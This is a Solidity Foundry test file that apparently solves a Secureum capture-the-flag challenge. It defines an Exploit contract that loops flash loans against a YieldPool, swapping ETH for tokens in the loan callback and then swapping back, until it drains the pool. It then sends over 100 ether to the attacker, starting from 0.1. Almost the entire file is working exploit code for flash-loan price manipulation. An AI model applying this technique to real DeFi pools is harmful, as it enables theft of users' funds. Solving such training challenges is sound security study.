// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {YieldPool, SecureumToken, IERC20} from "../src/6_yieldPool/YieldPool.sol";

/*////////////////////////////////////////////////////////////
//          DEFINE ANY NECESSARY CONTRACTS HERE             //
//    If you need a contract for your hack, define it below //
////////////////////////////////////////////////////////////*/
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract Exploit is IERC3156FlashBorrower{

    YieldPool public yieldPool;
    address attacker;
    uint256 msgvalue;

    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    constructor(address _pool){
        yieldPool = YieldPool(payable(_pool));
        attacker = msg.sender;
    }

    function attack() public payable{ 

        msgvalue = msg.value;
        IERC20(yieldPool.TOKEN()).approve(address(yieldPool), type(uint256).max);

        while(msgvalue < 100 ether){
            // @note
            // ETH exchange to token, token become more expensive; Token exchange to ETH, token become cheap
            // flashloan token, ETH become cheap; flashloan ETH, token become cheap
            yieldPool.flashLoan(
                IERC3156FlashBorrower(address(this)), yieldPool.ETH(), msgvalue * 100, new bytes(1) //@note need to pay fee
            );
            yieldPool.tokenToEth(IERC20(yieldPool.TOKEN()).balanceOf(address(this)));
            msgvalue = address(this).balance;
        }

        attacker.call{value: address(this).balance}("");
        
    }


    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32){

        yieldPool.ethToToken{value: address(this).balance}();
        console.log(IERC20(yieldPool.TOKEN()).balanceOf(address(this)));

        return CALLBACK_SUCCESS;
    }


    receive() external payable {}
}



/*////////////////////////////////////////////////////////////
//                     TEST CONTRACT                        //
////////////////////////////////////////////////////////////*/
contract Challenge6Test is Test {
    SecureumToken public token;
    YieldPool public yieldPool;

    address public attacker = makeAddr("attacker");
    address public owner = makeAddr("owner");

    function setUp() public {
        // setup pool with 10_000 ETH and ST tokens
        uint256 start_liq = 10_000 ether;
        vm.deal(address(owner), start_liq);
        vm.prank(owner);
        token = new SecureumToken(start_liq);
        yieldPool = new YieldPool(token);
        vm.prank(owner);
        token.increaseAllowance(address(yieldPool), start_liq);
        vm.prank(owner);
        yieldPool.addLiquidity{value: start_liq}(start_liq);

        // attacker starts with 0.1 ether
        vm.deal(address(attacker), 0.1 ether);
    }

    function testExploitPool() public {
        vm.startPrank(attacker);
        /*////////////////////////////////////////////////////
        //               Add your hack below!               //
        //                                                  //
        // terminal command to run the specific test:       //
        // forge test --match-contract Challenge6Test -vvvv //
        ////////////////////////////////////////////////////*/
        Exploit exp = new Exploit(address(yieldPool));
        exp.attack{value: 0.1 ether}();



        //==================================================//
        vm.stopPrank();

        assertGt(address(attacker).balance, 100 ether, "hacker should have more than 100 ether");
    }
}
